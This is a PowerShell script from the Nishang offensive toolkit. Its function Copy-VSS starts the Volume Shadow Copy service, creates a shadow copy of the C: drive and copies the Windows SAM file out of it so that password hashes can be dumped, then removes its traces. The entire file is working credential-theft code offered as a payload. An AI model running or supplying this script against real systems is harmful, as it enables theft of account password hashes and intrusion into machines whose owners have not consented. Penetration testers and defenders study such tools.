<#
.SYNOPSIS
Nishang Payload which copies the SAM file.

.DESCRIPTION
This payload uses the VSS service (starts it if not running), creates a shadow of C: 
and copies  the SAM file which could be used to dump password hashes from it. This must be run from an elevated shell.

.PARAMETER PATH
The path where SAM file would be saved. The folder must exist already.

.EXAMPLE
PS > Copy-VSS
Saves the SAM file in current run location of the payload.

.Example
PS > Copy-VSS -path C:\temp

.LINK
http://www.canhazcode.com/index.php?a=4
https://github.com/samratashok/nishang

.NOTES
Code by @al14s

#>


function Copy-VSS
{
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Path
    )
    $service = (Get-Service -name VSS)
    if($service.Status -ne "Running")
    {
        $notrunning=1
        $service.Start()
    }
    $id = (gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
    $volume = (gwmi win32_shadowcopy -filter "ID='$id'")
    $filepath = "$pwd\SAM"
    if ($path)
    {
        $filepath = "$path\SAM"
    }

    `cmd /c copy "$($volume.DeviceObject)\windows\system32\config\SAM" $filepath` 
    $volume.Delete()
    if($notrunning -eq 1)
    {
        $service.Stop()
    } 
}

